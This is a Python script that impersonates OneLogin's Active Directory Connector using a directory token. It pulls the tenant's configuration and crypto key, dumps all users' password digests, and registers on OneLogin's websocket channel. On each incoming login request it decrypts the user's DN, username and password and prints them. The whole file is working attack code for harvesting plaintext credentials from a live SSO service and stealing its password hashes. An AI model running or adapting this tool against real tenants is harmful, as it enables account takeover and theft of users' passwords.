import aiohttp
import websockets
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
import re
import json
import hashlib
from Crypto.Cipher import AES
import asyncio
import base64

class OneLogin:
  
  VERSION = "5.1.8"
  HOSTNAME = "EXAMPLE.internal.local"
  USER_AGENT = "ADC 5.1.8"
  
  CONFIGURATION_URL = "https://api.onelogin.com/api/adc/v4/configuration"
  EVENTS_URL = "https://api.onelogin.com/api/adc/v4/events/"
  USERS_URL = "https://api.onelogin.com/api/adc/v4/users/"
  SOCKET_IO_POLLING_URL = "https://smux.us.onelogin.com/socket.io/"
  SOCKET_IO_WEBSOCKET_URL = "wss://smux.us.onelogin.com/socket.io/"

  def __init__(self, apiKey, hostname):
    self.apiKey = apiKey
    self.__decryptionKey = None
    self.HOSTNAME = hostname

  async def getConfiguration(self):
    async with aiohttp.ClientSession() as session:

      params = "?version=" + self.VERSION + "&token=" + self.apiKey + "&mux=1&directory_token=" + self.apiKey + "&adcVersion=" + self.VERSION
      async with session.get(self.CONFIGURATION_URL + params, headers={"User-Agent": "ADC 5.1.8", "Accept": "application/xml", "Host": "api.onelogin.com", "Accept-Encoding": "gzip"}) as response:
        xml = await response.text()

        root = ET.fromstring(xml)

        self.cryptoKey = root.find("api_key").text
        self.baseDN = root.find("base_dn").text
        self.directoryId = root.find("directory_id").text
        self.connectorId = root.find("connector_id").text
        self.authenticationAttribute = root.find("authentication_attribute").text
        self.provisioningEnabled = root.find("provisioning_enabled").text
        self.syncDisabledUsers = root.find("sync_disabled_users").text
        self.isPrimary = root.find("is_primary").text
        self.deletionEnabled = root.find("deletion_enabled").text
        self.fields = root.find("fields").text

  async def sendEvents(self):
    async with aiohttp.ClientSession() as session:
      params = "?api_key=" + self.cryptoKey + "&directory_id=" + self.directoryId + "&directory_token=" + self.apiKey + "&adcVersion=" + self.VERSION
      data = f"<event><directory-id>{self.directoryId}</directory-id><event-type-id>44</event-type-id><host>{self.HOSTNAME}</host><notes>Started HTTP Server listener for SSO Identity Provider on [http://*:8080/onelogin/]</notes></event>"
      async with session.post(self.EVENTS_URL + params, headers={"User-Agent": "ADC 5.1.8", "Content-Type": "application/xml; charset=utf-8", "Accept": "application/xml", "Host": "api.onelogin.com", "Expect": "100-continue", "Accept-Encoding": "gzip"}, data=data) as response:
        resp = await response.text()

        if response.status == 201:
          print("[*] Successfully sent event to OneLogin")

  async def getUsers(self):
    async with aiohttp.ClientSession() as session:
      params = "?from_id=0&api_key=" + self.cryptoKey + "&directory_id=" + self.directoryId + "&directory_token=" + self.apiKey + "&adcVersion=" + self.VERSION
      async with session.get(self.USERS_URL + params, headers={"User-Agent": "ADC 5.1.8", "Accept": "application/xml", "Host": "api.onelogin.com", "Accept-Encoding": "gzip"}) as response:
        xml = await response.text()

        root = ET.fromstring(xml)

        for user in root.findall("user"):
          print(user.find("dn").text)
          print(user.find("external_id").text)
          print(user.find("digest").text)
          print(user.find("hash_algorithm").text)
          print(user.find("id").text)
          print("")
  
  def _get_req_file(self, name):
    with open(name, 'r') as file:
        return file.read()
    
  def _unpad(self, ct):
    return ct[:-ct[-1]]
  
  def _generate_decryption_key(self):
    self._decryptionKey = hashlib.sha1(self.cryptoKey.encode('utf-8')).hexdigest()[:32]

  def _decrypt(self, data, iv):
    cipher = AES.new(self._decryptionKey, AES.MODE_CBC, iv)
    return self._unpad(cipher.decrypt(data))
  
  def _decryptCreds(self, req):

    # Extract the iv and encrypted data
    iv = base64.b64decode(req["iv"])
    dnEncrypted = base64.b64decode(req["dn"])
    usernameEncrypted = base64.b64decode(req["user"])
    passwordEncrypted = base64.b64decode(req["pass"])

    # Generate our decryption key
    self._generate_decryption_key()

    # Decrypt the data
    print("[*] DN: " + self._decrypt(dnEncrypted, iv).decode("utf-8"))
    print("[*] Username: " + self._decrypt(usernameEncrypted, iv).decode("utf-8"))
    print("[*] Password: " + self._decrypt(passwordEncrypted, iv).decode("utf-8"))

  def _handleMessage(self, msg):
    if msg[1]["type"] == "request":
      body = json.loads(msg[1]["payload"]["body"])

      if body['cmd'] == "ping":
        print("[*] Ping received")
        return self._get_req_file("./data/ping_resp.json").replace("MESSAGE_ID", msg[1]["message-id"])
      
      elif body['cmd'] == "auth_req":
        # Parse the creds
        print("[*] Auth request received")
        self._decryptCreds(body)
        return self._get_req_file("./data/auth_resp.json").replace("MESSAGE_ID", msg[1]["message-id"])
      
      elif body['cmd'] == "reload_config":
        print("[*] Reload config request received]")
        return self._get_req_file("./data/reload_resp.json").replace("MESSAGE_ID", msg[1]["message-id"])

  async def webSocketMessageLoop(self, socket):
    msg = await socket.recv()
    if msg.startswith("42[\"message\""):
      req = json.loads(msg[2:])
      resp = self._handleMessage(req)
      if resp != None:
        await socket.send(resp)

  async def webSocketPingLoop(self, socket):
    await socket.send("2")
    await socket.recv() # 3
    print("[*] Pong received")

  async def startWebSocket(self):
    # First we send over the polling request (even though we are going to ignore it)
    async with aiohttp.ClientSession(skip_auto_headers=['Accept','Accept-Encoding','User-Agent']) as session:
      params = "?EIO=3&transport=polling"
      
      async with session.get(self.SOCKET_IO_POLLING_URL + params, headers={"Host": "smux.us.onelogin.com"}) as response:

        upgrades_response = await response.read()
        upgrades_response = upgrades_response.decode("utf-8", "ignore")

        # Extract sid with regex
        sid = re.search(r'sid":"(.+?)"', upgrades_response).group(1)

    # This is our polling loop
    params = "?EIO=3&transport=websocket&sid=" + sid
    async with websockets.connect(self.SOCKET_IO_WEBSOCKET_URL + params, user_agent_header=None, extensions=None, compression=None) as socket:
      await socket.send("2probe")
      await socket.recv() # 3probe
      await socket.send("5")
      await socket.recv() # 40
      await socket.send("42[\"register\",\"" + self.apiKey + "\"]")

      while True:
        try:
          await asyncio.wait_for(self.webSocketMessageLoop(socket), timeout=25)
        except asyncio.TimeoutError:
          print("[*] Ping time")
          await self.webSocketPingLoop(socket)
